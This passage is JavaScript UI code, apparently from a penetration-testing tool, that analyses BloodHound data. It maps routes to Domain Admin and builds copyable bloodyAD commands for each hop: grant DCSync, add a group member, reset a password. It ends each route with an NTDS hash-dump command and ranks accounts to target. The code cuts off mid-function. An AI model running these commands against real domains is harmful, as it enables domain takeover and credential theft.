/*!
 * obol ui — routes/domain.js — BloodHound domain analysis, 100% client-side.
 * Upload a SharpHound zip (or BloodHound-CE JSONs) -> OBOL.bloodhound parses + derives the
 * high-value census + owned→DA attack paths + a self-contained printable report. Analysis runs
 * in a Web Worker when available (big zips stay off the main thread), else on the main thread.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var U = OBOL.util;
  function esc(s) { return U.esc(s); }

  // The principal currently shown in the inspect slot. Module-scoped so it survives a re-render
  // (ticking "I Own This" re-renders the tab; we restore the card afterwards).
  var _inspecting = null;

  // The accounts you own, from three doors into one set: a stored credential, the engagement's
  // username param, and the principals you manually asserted ("I own this now") on the Domain tab
  // (eng.bloodhound.ownedExtra). A pasted login/crack mints a credential, so that door feeds the
  // same set; re-uploading BloodHound keeps ownedExtra, so that door does too.
  function ownedFromEngagement() {
    var eng = OBOL.store.active();
    var owned = [];
    (eng.credentials || []).forEach(function (c) { if (c.user) owned.push(String(c.user).toUpperCase()); });
    if (eng.params && eng.params.username) owned.push(String(eng.params.username).toUpperCase());
    var extra = (eng.bloodhound && eng.bloodhound.ownedExtra) || [];
    extra.forEach(function (x) { if (x) owned.push(String(x).split('@')[0].toUpperCase()); });
    return owned.filter(function (v, i, a) { return v && a.indexOf(v) === i; });
  }

  // Is this principal in the owned set (any of the three doors)?
  function isOwnedPrincipal(principal, owned) {
    var short = shortName(principal).toUpperCase();
    return (owned || []).some(function (o) { return shortName(o).toUpperCase() === short; });
  }

  // A per-tool command context for ONE principal: fills the DC/host/lhost and, if that account's
  // secret is in the credential store, its -H hash or -p password so the walk commands are complete.
  function cmdCtxFor(principal) { return cmdCtx([principal], true); }

  // Fill the query-card commands from what this engagement already knows: the DC/target host, the
  // operator's listener IP, and (on-screen only) the owned account's secret. includeSecret is false
  // for the exportable report so hashes/passwords never land in a shareable document.
  function cmdCtx(owned, includeSecret) {
    var eng = OBOL.store.active() || {}, params = eng.params || {};
    var dc = null;
    try {
      var facts = OBOL.store.factSet();
      var dcf = (facts.values && facts.values('ad.dc_candidate')) || [];
      if (dcf[0] && dcf[0].host) dc = dcf[0].host;
      var ctxOut = { dc: dc || params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null, pw: null, nt: null };
      if (includeSecret && owned && owned.length) {
        var firstUser = String(owned[0]).split('@')[0].toLowerCase();
        var creds = [];
        try { creds = (OBOL.creds && OBOL.creds.gather) ? OBOL.creds.gather(eng, facts) : (eng.credentials || []); }
        catch (e) { creds = eng.credentials || []; }
        var c = creds.filter(function (x) { return x && x.user && String(x.user).toLowerCase() === firstUser; })[0];
        if (c) {
          var h = c.nthash || c.hash, pw = c.password || c.plaintext || c.secret;
          // carry the RAW secret parts too, so per-tool auth syntax (evil-winrm -H, xfreerdp /pth,
          // impacket -hashes) is built correctly for a hash-only identity — not a blank -p ''.
          if (h && /^[a-fA-F0-9]{32}$/.test(String(h))) { ctxOut.secret = '-H ' + h; ctxOut.nt = h; }
          else if (pw) { ctxOut.secret = "-p '" + pw + "'"; ctxOut.pw = pw; }
        }
      }
      return ctxOut;
    } catch (e) { return { dc: params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null }; }
  }

  function shortName(s) { return String(s == null ? '' : s).split('@')[0]; }

  // The coach's top queued move + how many it ranks right now, so the Domain tab can say "this data
  // became your next moves, here they are in Next Steps". General: any ingest re-ranks the coach.
  function coachQueued() {
    try {
      var ranked = OBOL.pack.rankActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
      return { top: ranked[0] || null, count: ranked.length };
    } catch (e) { return { top: null, count: 0 }; }
  }

  // A bloodyAD one-liner for walking one hop of the owned->DA path. General per (edge, target kind):
  // control of the DOMAIN -> grant yourself DCSync; a group -> add yourself as a member; a user ->
  // reset or shadow it. bloodyAD is obol's house ACL-abuse tool, so the whole chain reads consistently.
  function bdPrefix(ctx, domain, you) {
    var auth = ctx.pw ? ("-p '" + ctx.pw + "'") : (ctx.nt ? ("-p ':" + ctx.nt + "'") : "-p '<password>'");
    return "bloodyAD -u '" + (you || '<you>') + "' " + auth + " -d " + (domain || '<domain>') + " --host " + (ctx.dc || '<dc-ip>');
  }
  function hopCommand(hop, ctx, domain, you) {
    var pre = bdPrefix(ctx, domain, you), tgt = shortName(hop.to), edge = String(hop.edge || ''), kind = String(hop.to_kind || '').toLowerCase();
    if (/memberof/i.test(edge)) return '';   // membership is not an action you take, it is inherited
    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add dcsync '" + (you || '<you>') + "'";
    if (/group/.test(kind) || /addmember|addself/i.test(edge)) return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
    if (/forcechangepassword/i.test(edge)) return pre + " set password '" + tgt + "' 'Newp@ss123'";
    if (/genericall|genericwrite|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
    return pre + "  # abuse " + edge + " on " + tgt;
  }

  // The "route to Domain Admin" block: the derived shortest owned->DA path as NUMBERED steps, each with
  // the exact bloodyAD command for its edge, ending in the DCSync cash-in, plus a bridge to Next Steps.
  // Reuses view.analysis (already computed) so it is general to any collection, not this box.
  function routeStepsHtml(view, owned, summary, ctx) {
    var an = (view && view.analysis) || {};
    if (!an.headline) return '';
    var you = shortName((owned && owned[0]) || '') || '<you>';
    var domain = (summary && summary.domain) || '';
    var out = '<h2 class="coach-sec-h">Route To Domain Admin</h2><div class="bh-route"><p class="bh-route-head">' + esc(an.headline) + '</p>';
    if (an.paths && an.paths.length) {
      var hops = an.paths[0].hops || [], step = 0;
      var chain = '<div class="bh-route-chain"><span class="bh-rn owned">' + esc(you) + '</span>';
      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
      out += chain + '</div><ol class="bh-steps">';
      hops.forEach(function (h) {
        var cmd = hopCommand(h, ctx, domain, you);
        if (!cmd) return;   // skip pure MemberOf hops (no action)
        step++;
        out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
          + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
      });
      // the cash-in: once you hold DCSync, dump the Administrator hash
      var sec = ctx.secret || "-p '<password>'";
      var dump = 'nxc smb ' + (ctx.dc || '<dc-ip>') + " -u '" + you + "' " + sec + ' --ntds';
      out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
        + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol>';
    }
    out += '</div>';
    return out;
  }

  // A bounded list that reveals the rest behind a "+ N more" button (no data hidden for good, the
  // user can open everything). itemsHtml is an array of <li> strings; the toggle is wired in mounted().
  function expandableList(itemsHtml, limit, noun) {
    limit = limit || 8;
    var n = itemsHtml.length;
    if (n <= limit) return '<ul class="bh-princ">' + itemsHtml.join('') + '</ul>';
    var head = itemsHtml.slice(0, limit).join(''), rest = itemsHtml.slice(limit).join('');
    var extra = n - limit;
    return '<ul class="bh-princ">' + head + '</ul>'
      + '<ul class="bh-princ bh-more" hidden>' + rest + '</ul>'
      + '<button class="bh-more-btn" type="button">+ ' + extra + ' more ' + esc(noun || 'item') + (extra === 1 ? '' : 's') + '</button>';
  }

  // The runnable commands that only make sense once you OWN this principal: walk its shortest path to
  // Domain Admin, one bloodyAD command per abusable hop, ending in the DCSync cash-in. Gated: only
  // rendered for an owned account (the gate below hides it until one of the three ownership doors opens).
  function ownedRouteCommands(principal, paths, summary, ctx) {
    if (!paths || !paths.paths || !paths.paths.length) {
      return '<div class="bh-acq"><div class="bh-acq-h">You Own ' + esc(shortName(principal)) + '</div>'
        + '<p class="bh-x-line bh-x-none">No path to Domain Admin from this account, use what it controls above, or pivot.</p></div>';
    }
    var you = shortName(principal), domain = (summary && summary.domain) || '';
    var hops = paths.paths[0];
    var out = '<div class="bh-acq"><div class="bh-acq-h">Walk This Path (you own ' + esc(you) + ')</div><ol class="bh-steps">';
    hops.forEach(function (h) {
      var cmd = hopCommand(h, ctx, domain, you);
      if (!cmd) return;
      out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
        + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
    });
    var sec = ctx.secret || "-p '<password>'";
    var dump = 'nxc smb ' + (ctx.dc || '<dc-ip>') + " -u '" + you + "' " + sec + ' --ntds';
    out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
      + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol></div>';
    return out;
  }

  // Inspect ANY principal: its tags (what the data says about it), its shortest path(s) to Domain
  // Admin, what it controls (forward reachability, expandable), and then EITHER the runnable walk
  // commands (if you own it) OR the data-indicated way to acquire it plus the ownership gate (if you
  // do not). Lets a user theorize and target from any account, not only the creds they hold.
  function inspectHtml(principal, summary, owned, ctx) {
    if (!principal || !summary) return '';
    var isOwned = isOwnedPrincipal(principal, owned);
    var prof = OBOL.bloodhound.principalProfile(summary, principal);
    var paths = OBOL.bloodhound.ownedPaths(summary, [principal]) || { paths: [] };
    var ctl = OBOL.bloodhound.controls(summary, principal) || { controls: [], groups: [], count: 0 };

    var tags = [];
    if (isOwned) tags.push('<span class="bh-tag own">Owned</span>');
    if (prof.dcsync) tags.push('<span class="bh-tag crit">Can DCSync</span>');
    if (prof.unconstrained) tags.push('<span class="bh-tag crit">Unconstrained Delegation</span>');
    if (prof.high_value) tags.push('<span class="bh-tag crit">High Value</span>');
    if (prof.kerberoastable) tags.push('<span class="bh-tag warn">Kerberoastable</span>');
    if (prof.asrep_roastable) tags.push('<span class="bh-tag warn">AS-REP</span>');
    if (prof.password_not_required) tags.push('<span class="bh-tag free">Blank Password</span>');

    var out = '<div class="bh-explore-card"><h3>' + esc(shortName(principal))
      + ' <span class="bh-x-kind">' + esc(prof.type || 'principal') + '</span></h3>'
      + (tags.length ? '<div class="bh-x-tags">' + tags.join('') + '</div>' : '');

    if (paths.paths && paths.paths.length) {
      var hops = paths.paths[0];
      var chain = '<span class="bh-rn' + (isOwned ? ' owned' : '') + '">' + esc(shortName(principal)) + '</span>';
      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
      out += '<p class="bh-x-line"><b>' + paths.paths.length + '</b> path(s) to Domain Admin, shortest ' + hops.length + ' hop(s):</p><div class="bh-route-chain">' + chain + '</div>';
    } else {
      out += '<p class="bh-x-line bh-x-none">No direct path to Domain Admin derived from this account.</p>';
    }

    if (ctl.count) {
      out += '<p class="bh-x-line">Controls <b>' + ctl.count + '</b> object(s)' + (ctl.groups.length ? ', member of ' + ctl.groups.length + ' group(s)' : '') + ':</p>'
        + expandableList(ctl.controls.map(function (x) {
            return '<li><span class="bh-re">' + esc(x.edge) + '</span> <button class="bh-princ-x" data-explore="' + U.attr(x.name) + '">' + esc(shortName(x.name)) + '</button> <span class="bh-x-kind">' + esc(x.type) + '</span></li>';
          }), 8, 'controlled object');
    } else {
      out += '<p class="bh-x-line bh-x-none">Controls nothing abusable in this collection.</p>';
    }

    if (isOwned) {
      out += ownedRouteCommands(principal, paths, summary, ctx);
    } else {
      var acqCtx = Object.assign({}, ctx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
      var acq = OBOL.bloodhound.acquisitionLines(summary, principal, acqCtx);
      if (acq.length) {
        out += '<div class="bh-acq"><div class="bh-acq-h">How To Get This Account</div>'
          + acq.map(function (a) {
              return '<div class="bh-acq-why">' + esc(a.why) + '</div>'
                + '<div class="bh-cmd"><code>' + esc(a.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(a.cmd) + '">Copy</button></div>';
            }).join('') + '</div>';
      }
      out += '<div class="bh-gate"><label class="bh-gate-own"><input type="checkbox" class="bh-own-check" data-own="' + U.attr(shortName(principal)) + '"> I Own This Account Now</label>'
        + '<p class="bh-gate-note">The commands for walking this account’s path stay hidden until you own it. They unlock when you tick this box, paste proof of the login on Next Steps, or re-upload BloodHound after you take it over. Ticking is a what-if you can undo: untick to revert.</p></div>';
    }
    return out + '</div>';
  }

  // Human label for a census-flag diff key.
  function labelFlag(key) {
    return ({
      dcsync_principals: 'Able To DCSync',
      kerberoastable: 'Kerberoastable',
      asrep_roastable: 'AS-REP Roastable',
      password_not_required: 'Blank-Password (PASSWD_NOTREQD)',
      unconstrained_delegation: 'Unconstrained Delegation',
    })[key] || key;
  }

  // "What Changed Since Last Collection": the temporal diff from OBOL.bloodhound.diffCollections.
  // New edges are the leverage that opened (re-collect after a foothold and this shows what you earned);
  // flag deltas say who became or stopped being roastable / a DCSync principal. Empty when nothing changed.
  function diffHtml(diff) {
    if (!diff || (!diff.changed && !diff.route)) return '';
    function edgeLi(e) {
      return '<li><button class="bh-princ-x" data-explore="' + U.attr(e.from) + '">' + esc(shortName(e.from)) + '</button>'
        + ' <span class="bh-re">' + esc(e.edge) + '</span> '
        + '<button class="bh-princ-x" data-explore="' + U.attr(e.to) + '">' + esc(shortName(e.to)) + '</button></li>';
    }
    var out = '<h2 class="coach-sec-h">What Changed Since Last Collection</h2><div class="bh-diff">';
    if (diff.route) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h fast">A faster route to Domain Admin opened: '
        + diff.route.now + ' hop' + (diff.route.now === 1 ? '' : 's')
        + (diff.route.prev ? (' (was ' + diff.route.prev + ')') : ', where there was none before')
        + '. obol re-ranked your next moves.</div></div>';
    }
    if (diff.edges.added.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h add">New leverage: ' + diff.edges.added.length + ' edge' + (diff.edges.added.length === 1 ? '' : 's') + '</div>'
        + expandableList(diff.edges.added.map(edgeLi), 8, 'edge') + '</div>';
    }
    if (diff.edges.removed.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">Gone: ' + diff.edges.removed.length + ' edge' + (diff.edges.removed.length === 1 ? '' : 's') + '</div>'
        + expandableList(diff.edges.removed.map(edgeLi), 8, 'edge') + '</div>';
    }
    Object.keys(diff.flags).forEach(function (k) {
      var f = diff.flags[k];
      if (f.added.length) {
        out += '<div class="bh-diff-sec"><div class="bh-diff-h add">Now ' + esc(labelFlag(k)) + ' (' + f.added.length + ')</div>'
          + '<div class="bh-diff-names">' + f.added.map(function (x) { return '<button class="bh-princ-x" data-explore="' + U.attr(x) + '">' + esc(shortName(x)) + '</button>'; }).join(' ') + '</div></div>';
      }
      if (f.removed.length) {
        out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">No Longer ' + esc(labelFlag(k)) + ' (' + f.removed.length + ')</div>'
          + '<div class="bh-diff-names">' + f.removed.map(function (x) { return esc(shortName(x)); }).join(', ') + '</div></div>';
      }
    });
    if (diff.principals.added.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h add">New principals (' + diff.principals.added.length + ')</div>'
        + '<div class="bh-diff-names">' + diff.principals.added.slice(0, 40).map(function (p) { return esc(shortName(p.name)); }).join(', ')
        + (diff.principals.added.length > 40 ? ', and ' + (diff.principals.added.length - 40) + ' more' : '') + '</div></div>';
    }
    if (diff.principals.removed.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">Removed principals (' + diff.principals.removed.length + ')</div>'
        + '<div class="bh-diff-names">' + diff.principals.removed.slice(0, 40).map(function (p) { return esc(shortName(p.name)); }).join(', ')
        + (diff.principals.removed.length > 40 ? ', and ' + (diff.principals.removed.length - 40) + ' more' : '') + '</div></div>';
    }
    return out + '</div>';
  }

  // "Best Accounts To Hunt Next": the marginal-value targeting board. The accounts you can go get right
  // now (their own flags say how), ranked by how close owning them puts you to Domain Admin, each with
  // its one-line acquisition command. The standout "exceed BloodHound" view: not paths, but who to hunt.
  function huntHtml(summary, owned, ctx) {
    var hunt = OBOL.bloodhound.bestNextTargets(summary, owned, { limit: 50 });
    if (!hunt.targets.length) return '';
    var acqCtx = Object.assign({}, ctx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
    var chipName = { asrep: 'AS-REP', kerberoast: 'Kerberoast', blankpw: 'Blank Password' };
    function valueLine(t) {
      if (t.hops == null) return 'A free credential, no direct path to Domain Admin from it.';
      if (hunt.currentBest == null) return 'Opens a route to Domain Admin: ' + t.hops + ' hop' + (t.hops === 1 ? '' : 's') + '.';
      if (t.saves > 0) return t.hops + ' hop' + (t.hops === 1 ? '' : 's') + ' to Domain Admin, a shortcut that saves ' + t.saves + ' hop' + (t.saves === 1 ? '' : 's') + '.';
      return t.hops + ' hop' + (t.hops === 1 ? '' : 's') + ' to Domain Admin.';
    }
    function rowHtml(t) {
      var acq = OBOL.bloodhound.acquisitionLines(summary, t.name, acqCtx)[0];
      var cmd = acq ? ('<div class="bh-cmd"><code>' + esc(acq.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(acq.cmd) + '">Copy</button></div>') : '';
      return '<div class="bh-hunt-row"><div class="bh-hunt-top">'
        + '<button class="bh-princ-x" data-explore="' + U.attr(t.name) + '">' + esc(t.short) + '</button> <span class="bh-x-kind">' + esc(t.type) + '</span>'
        + t.weaknesses.map(function (w) { return '<span class="bh-tag warn">' + esc(chipName[w] || w) + '</span>'; }).join('')
        + (t.saves > 0 ? '<span class="bh-tag crit">Shortcut</span>' : '') + '</div>'
        + '<div class="bh-hunt-val">' + esc(valueLine(t)) + '</div>' + cmd + '</div>';
    }
    var rows = hunt.targets.map(rowHtml);
    var out = '<h2 class="coach-sec-h">Best Accounts To Hunt Next</h2>'
      + '<p class="route-sub">Accounts you can go get right now (their own BloodHound flags say how), ranked by how close owning them puts you to Domain Admin. On an exam, go hunt these.</p>';
    if (rows.length <= 6) {
      out += '<div class="bh-hunt">' + rows.join('') + '</div>';
    } else {
      out += '<div class="bh-hunt">' + rows.slice(0, 6).join('') + '</div>'
        + '<div class="bh-hunt bh-more" hidden>' + rows.slice(6).join('') + '</div>'
        + '<button class="bh-more-btn" type="button">+ ' + (rows.length - 6) + ' more target' + (rows.length - 6 === 1 ? '' : 's') + '</button>';
    }
    return out;
  }

  function render() {
    var eng = OBOL.store.active();
    var summary = eng && eng.bloodhound;
    var html = '<section class="domain-route">'
      + '<h1 class="route-h1">Domain (BloodHound)</h1>'
      + '<p class="route-sub">Upload a SharpHound <code>.zip</code> (or BloodHound-CE <code>.json</code> files). Everything is parsed and analysed in your browser, nothing is uploaded anywhere.</p>'
      + '<div class="bh-drop" id="bh-drop" tabindex="0" role="button">Drop a SharpHound .zip here, or click to choose files'
      + '<input type="file" id="bh-file" accept=".zip,.json" multiple hidden></div>'
      + '<div id="bh-status" class="route-sub"></div>';

    if (summary) {
      var owned = ownedFromEngagement();
      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; });
      var view = OBOL.bloodhound.domainView(summary, owned, cmdCtx(owned, true));

      // Inspect dropdown: every principal, ranked by closeness to Domain Admin, so you can select any
      // account (owned or not) and see its paths. Owned accounts are marked; non-owned ones keep their
      // commands gated until you own them. This is the "select a user and see their paths" control.
      var plist = OBOL.bloodhound.principalList(summary, { types: ['users', 'groups', 'computers'] });
      var opts = '<option value="">Select an account to inspect…</option>' + plist.map(function (p) {
        var mk = ownedUpper[p.short.toUpperCase()] ? ' (owned)' : '';
        var hop = (p.hops != null) ? (' · ' + p.hops + ' hop' + (p.hops === 1 ? '' : 's') + ' to DA') : '';
        return '<option value="' + U.attr(p.name) + '">' + esc(p.short) + mk + ' · ' + esc(p.type) + hop + '</option>';
      }).join('');

      html += '<div class="bh-summary-head"><h2 class="coach-sec-h">' + esc(summary.domain || 'domain')
        + ': ' + (typeof summary.users === 'number' ? summary.users : (summary.users ? summary.users.length : 0)) + ' users, ' + (summary.computers ? summary.computers.length : 0) + ' computers'
        + (owned.length ? ('<span class="bh-owned-count">' + owned.length + ' owned</span>') : '') + '</h2>'
        + '<div class="bh-head-controls"><label class="bh-inspect-lbl">Inspect <select id="bh-inspect" class="bh-select">' + opts + '</select></label>'
        + '<button id="bh-report" class="btn-primary">Open Report</button></div></div>'
        + '<div id="bh-inspect-slot" class="bh-inspect-slot"></div>';

      // What Changed Since Last Collection: the temporal diff from the prior upload (if any).
      html += diffHtml(summary.diff);

      // Bridge: this data became the coach's next moves. Tells the user where the "do this" lives.
      var q = coachQueued();
      if (q.top) {
        var fast = (summary.diff && summary.diff.route) ? true : false;
        html += '<a class="bh-bridge' + (fast ? ' fast' : '') + '" href="#/path">'
          + '<span class="bh-bridge-k">' + (fast ? 'A faster route to Domain Admin opened. ' : '') + 'obol turned this graph into your next moves.</span> '
          + '<span class="bh-bridge-top">Next up: ' + esc(q.top.title) + '</span>'
          + '<span class="bh-bridge-go">Open Next Steps →</span></a>';
      }

      // Route to Domain Admin: the derived owned->DA path as numbered steps with the command per hop.
      html += routeStepsHtml(view, owned, summary, cmdCtx(owned, true));

      // Interactive attack-path graph (parity with obol-local's draggable domain graph).
      html += '<h2 class="coach-sec-h">Attack-path graph</h2>'
        + '<div id="bh-graph" class="bh-graph-host">'
        + (owned.length ? '' : '<div class="coach-empty">Own an account (a credential, or tick "I Own This" on an inspected account) to derive and graph owned→Domain-Admin paths.</div>')
        + '</div>';

      // Best Accounts To Hunt Next: the marginal-value board (who to go get to land closest to DA).
      html += huntHtml(summary, owned, cmdCtx(owned, true));

      // Targeting board: who is closest to Domain Admin. Click a row to inspect that account. The whole
      // list is available behind "+ N more" so you can explore all the data, not just the top 12.
      var near = (OBOL.bloodhound.nearestToGoal(summary) || []).filter(function (r) { return /user|group|computer/.test(r.type); });
      if (near.length) {
        function browHtml(r) {
          var isOwn = ownedUpper[shortName(r.name).toUpperCase()];
          return '<button class="bh-brow' + (isOwn ? ' owned' : '') + '" data-explore="' + U.attr(r.name) + '"><span class="bh-bhops">' + r.hops + ' hop' + (r.hops === 1 ? '' : 's') + '</span>'
            + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(shortName(r.name)) + (isOwn ? ' <span class="bh-tag own">owned</span>' : '') + '</span></button>';
        }
        html += '<h2 class="coach-sec-h">Closest To Domain Admin</h2>'
          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to inspect that account’s paths and what it controls.</p>'
          + '<div class="bh-board">' + near.slice(0, 12).map(browHtml).join('') + '</div>';
        if (near.length > 12) {
          html += '<div class="bh-board bh-more" hidden>' + near.slice(12).map(browHtml).join('') + '</div>'
            + '<button class="bh-more-btn" type="button">+ ' + (near.length - 12) + ' more account' + (near.length - 12 === 1 ? '' : 's') + '</button>';
        }
      }

      // High-value queries: matched cards first, the empty ones collapsed so the signal is up top.
      function cardHtml(s) {
        var items = s.items || s.principals || [];
        var n = items.length || s.count || 0;
        var cls = /admin|dcsync|unconstrained|domain admin|enterprise/i.test(s.title) ? 'crit' : (/kerberoast|as-?rep|roast/i.test(s.title) ? 'warn' : '');
        var free = /as-?rep|password not required/i.test(s.title);
        var cmds = (s.commands || []).slice(0, 3).map(function (c) {
          var line = typeof c === 'string' ? c : (c.run || c.cmd || c.command || '');
          return line ? '<div class="bh-cmd"><code>' + esc(line) + '</code><button class="btn-copy" data-copy="' + U.attr(line) + '">Copy</button></div>' : '';
        }).join('');
        var detail = items.length
          ? '<details class="bh-detail"><summary>' + items.length + ' ' + (items.length === 1 ? 'match' : 'matches') + '</summary>'
            + '<ul class="bh-princ">' + items.map(function (p) {
                var owns = ownedUpper[shortName(p).toUpperCase()];
                return '<li><button class="bh-princ-x" data-explore="' + U.attr(p) + '">' + esc(p) + '</button>'
                  + (owns ? ' <span class="bh-tag own">owned</span>' : '') + '</li>';
              }).join('') + '</ul></details>'
          : '';
        return '<div class="bh-card"><h3>' + esc(s.title) + (free ? ' <span class="bh-tag free">costs nothing</span>' : '') + '</h3>'
          + '<div class="bh-count ' + cls + '">' + n + '</div>'
          + (s.hint ? '<div class="bh-hint">' + esc(s.hint) + '</div>' : '')
          + (s.cash ? '<div class="bh-cash">' + esc(s.cash) + '</div>' : '')
          + detail + (cmds ? '<div class="bh-cmds">' + cmds + '</div>' : '') + '</div>';
      }
      var secs = view.sections || [];
      var matched = secs.filter(function (s) { return (s.items || s.principals || []).length || s.count; });
      var empty = secs.filter(function (s) { return !((s.items || s.principals || []).length || s.count); });
      html += '<h2 class="coach-sec-h">High-Value Queries</h2><div class="bh-census">' + matched.map(cardHtml).join('') + '</div>';
      if (empty.length) {
        html += '<details class="bh-empties"><summary>Show ' + empty.length + ' queries with no matches</summary>'
          + '<div class="bh-census">' + empty.map(cardHtml).join('') + '</div></details>';
      }
      html += '<div id="bh-report-slot"></div>';
    }
    html += '</section>';
    return html;
  }

  function readFile(file) {
    return new Promise(function (resolve) {
      var r = new FileReader();
      var isZip = /\.zip$/i.test(file.name);
      r.onload = function () { resolve({ name: file.name, arrayBuffer: isZip ? r.result : undefined, text: isZip ? undefined : r.result }); };
      r.onerror = function () { resolve(null); };
      if (isZip) r.readAsArrayBuffer(file); else r.readAsText(file);
    });
  }

  async function ingest(fileList) {
    var status = document.getElementById('bh-status');
    if (status) status.textContent = 'Parsing ' + fileList.length + ' file(s) in your browser…';
    var files = (await Promise.all(Array.prototype.map.call(fileList, readFile))).filter(Boolean);
    try {
      var prevSummary = (OBOL.store.active() || {}).bloodhound;
      // Diff this upload against the previous collection (if any) over its retained graph, so the
      // tab can show what new leverage opened. Carry the manually-asserted owned set forward so
      // re-collecting does not drop the accounts you had already ticked as owned.
      var prevFp = (prevSummary && prevSummary._graph) ? OBOL.bloodhound.graphFingerprint(prevSummary) : null;
      var summary = await OBOL.bloodhound.parse(files);
      summary.diff = prevFp ? OBOL.bloodhound.diffCollections(prevFp, OBOL.bloodhound.graphFingerprint(summary)) : null;
      summary.ownedExtra = (prevSummary && prevSummary.ownedExtra) || [];
      var owned = ownedFromEngagement();
      var paths = OBOL.bloodhound.ownedPaths(summary, owned);
      // Did this collection OPEN A FASTER ROUTE to Domain Admin for the accounts you own? (A re-collect
      // after a foothold often does.) Compare the shortest owned->DA length now vs in the prior graph;
      // if it shrank (or a route appeared where there was none), note it so the bridge can say so. The
      // coach already re-ranks on the new ad.attack_paths fact; this is the visible "it got faster" cue.
      if (summary.diff && owned.length) {
        var nowLen = (paths.paths && paths.paths[0]) ? paths.paths[0].length : 0;
        var prevLen = (prevSummary && prevSummary._graph)
          ? (function () { var pp = OBOL.bloodhound.ownedPaths(prevSummary, owned); return (pp.paths && pp.paths[0]) ? pp.paths[0].length : 0; })() : 0;
        if (nowLen && (!prevLen || nowLen < prevLen)) summary.diff.route = { now: nowLen, prev: prevLen || null };
      }
      var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
      // Keep the transient _graph on the persisted summary so the interactive graph + census can
      // be re-derived (and owned-principal recompute works) after reload — obol-local drops it only
      // because its server keeps a lean SQLite store; the browser's IndexedDB can hold it.
      OBOL.store.update(function (eng) { eng.bloodhound = summary; }, 'bloodhound');
      OBOL.store.addFacts(facts, 'bloodhound');
      OBOL.app.renderSidebar();
      var changeNote = (summary.diff && summary.diff.changed) ? ', changes since last collection' : '';
      U.toast('Ingested ' + (summary.domain || 'domain') + ': ' + facts.length + ' facts' + changeNote);
      OBOL.router.render();
    } catch (e) {
      if (status) status.textContent = 'Parse failed: ' + (e && e.message);
      U.toast('BloodHound parse failed', 'err');
    }
  }

  function mounted(ctx) {
    var mount = (ctx && ctx.mount) || document;   // was referenced below but never defined: copy/report wiring silently threw
    var drop = document.getElementById('bh-drop');
    var input = document.getElementById('bh-file');
    if (drop && input) {
      drop.addEventListener('click', function () { input.click(); });
      drop.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); input.click(); } });
      input.addEventListener('change', function () { if (input.files.length) ingest(input.files); });
      ['dragover', 'dragenter'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.add('drag'); }); });
      ['dragleave', 'drop'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.remove('drag'); }); });
      drop.addEventListener('drop', function (e) { if (e.dataTransfer && e.dataTransfer.files.length) ingest(e.dataTransfer.files); });
    }
    // render the interactive attack-path graph
    var eng0 = OBOL.store.active();
    if (eng0 && eng0.bloodhound && OBOL.bhgraph) {
      var owned0 = ownedFromEngagement();
      var view0 = OBOL.bloodhound.domainView(eng0.bloodhound, owned0);
      var host = document.getElementById('bh-graph');
      var g = view0.analysis && view0.analysis.graph;
      if (host && g && g.nodes && g.nodes.length) {
        OBOL.bhgraph.renderInto(host, g, { onNodeClick: function (id) { doInspect(id); } });
      }
    }
    // copy buttons on the query cards
    U.on(mount, 'click', '.btn-copy', function (e, b) {
      var v = b.getAttribute('data-copy'); if (v) U.copy(v).then(function (ok) { U.toast(ok ? 'Copied' : 'Copy failed', ok ? '' : 'err'); });
    });

    // Inspect an account: the dropdown, a targeting-board row, a census principal, a diff name, or a
    // controlled-object link all compute that principal's tags, paths to DA, controls, and either its
    // walk commands (if owned) or how to acquire it + the ownership gate (if not). Theorize or target
    // from any account, not only the creds you hold. _inspecting survives a re-render (checkbox toggle).
    function doInspect(principal) {
